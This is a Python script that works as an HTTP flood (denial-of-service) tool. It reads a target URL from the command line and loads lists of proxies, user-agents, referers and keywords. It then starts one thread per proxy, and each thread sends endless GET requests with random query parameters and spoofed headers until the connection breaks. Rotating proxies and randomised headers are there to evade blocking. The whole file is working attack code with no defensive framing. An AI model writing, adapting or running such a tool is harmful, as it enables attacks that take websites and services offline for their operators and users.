# -*- coding: utf-8 -*-
import sys
import os
import threading
import random
import requests
import time
import string
from queue import Queue
from threading import Thread

#naming the files

proxy_file = 'proxy.txt'
ua_file = 'user-agents.txt'
ref_file = 'referers.txt'
keywords_file = 'keywords.txt'
#initializing variables
url = sys.argv[1]
#trying to find and parse file with proxies
try:
	if os.stat(proxy_file).st_size > 0:
		with open(proxy_file) as proxy:
			ips = [row.rstrip() for row in proxy]
	else: 
		print('Error: File %s is empty!' % proxy_file)
except OSError:
	print('Error: %s was not found!' % proxy_file)
#trying to find and parse file with User-Agents
try:
	if os.stat(ua_file).st_size > 0:
		with open(ua_file) as user_agents:
			ua = [row.rstrip() for row in user_agents]
	else:
		print('Error: File %s is empty' % ua_file)
except OSError:
	print('Error: %s was not found!' % ua_file)
#trying to find and parse file with referers
try:
	if os.stat(ref_file).st_size > 0:
		with open(ref_file) as referers:
			ref = [row.rstrip() for row in referers]
	else:
		print('Error: File %s is empty!' % ref_file)
except OSError:
	print('Error: %s was not found!' % ref_file)
#trying to find and parse file with keywords
try:
	if os.stat(keywords_file).st_size > 0:
		with open(keywords_file) as keywords:
			keyword = [row.rstrip() for row in keywords]
	else:
		print('Error: File %s is empty!' % keywords_file)
except OSError:
	print('Error: %s was not found!' % keywords_file)
#
print('Loaded: {} proxies, {} user-agents, {} referers, {} keywords'.format(len(ips), len(ua), len(ref), len(keyword)))
print('Start sending requests...')
	
def request(index):
#	index = random.randint(0,len(ips)-1)
	while True:
		payload = {random.choice(keyword): random.choice(keyword)}
		headers = {'User-Agent': random.choice(ua),
			'Referer': url+'/'+random.choice(keyword)}
		proxy = {'http': ips[index]}
		try:
			r = requests.get(url, params=payload, headers=headers, proxies=proxy)
		except requests.exceptions.ChunkedEncodingError:
			print('Server returned nothing(0 bytes). Breaking connection.')
			break
		except requests.exceptions.ConnectionError as err:
			print('Connection error!')
			break
			
# Create the queue and thread pool.
q = Queue()
try:
	for i in range(len(ips)):
		t = threading.Thread(target=request, args=(i,))
		t.start()
except KeyboardInterrupt:
	print('Stopping...')
	sys.exit()
